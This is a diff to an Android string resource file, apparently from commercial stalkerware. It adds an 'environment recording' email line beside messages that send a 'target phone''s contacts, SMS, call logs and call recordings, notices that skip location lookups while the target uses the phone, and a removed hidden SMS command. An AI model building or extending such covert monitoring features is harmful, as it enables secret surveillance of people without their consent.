@@ -42,7 +42,8 @@
     <string name="mail_from">From</string>
     <string name="mail_description">(contacts, SMS and phone call list attached)</string>
     <string name="mail_body_info">Hi, this is an auto mail from %s with contacts, SMS and phone call list attached.</string>
-    <string name="mail_body_record">Hi,this is an auto mail from %s with phone call recording attached.</string>
+    <string name="mail_body_call_record">Hi, this is an auto mail from %s with phone call recording attached.</string>
+    <string name="mail_body_env_record">Hi, this is an auto mail from %s with environment recording attached.</string>
     
     <!-- Location -->
     <string name="location_fail_screen_on">The target phone is now being viewed or operated, so do not get its location for safety reason. Please try again later.</string>
@@ -160,7 +161,7 @@
     <string name="msg_sms_times_over_in_trial">Notice: transferred SMS reached 5 limitation. For getting license, please contact </string>
     <string name="msg_recording_times_over_in_trial">Notice: phone call recording reached 3 limitation. For getting license, please contact </string>
     <string name="msg_changed_sim">%s changed phone card.</string>
-    <string name="msg_changed_sim_new_number_workaround"> The phone number of this SMS is the new number. Please send #9#+the new number to target phone to confirm (will not display there).</string>
+    <string name="msg_changed_sim_new_number_workaround"> The phone number of this SMS is just the new number.</string>
     <string name="msg_changed_sim_new_number"> New phone number: %s</string>
     <string name="msg_trial_expire_or_not_licensed">Out of trial or not licensed, setting dialog cannot be triggered.</string>
     
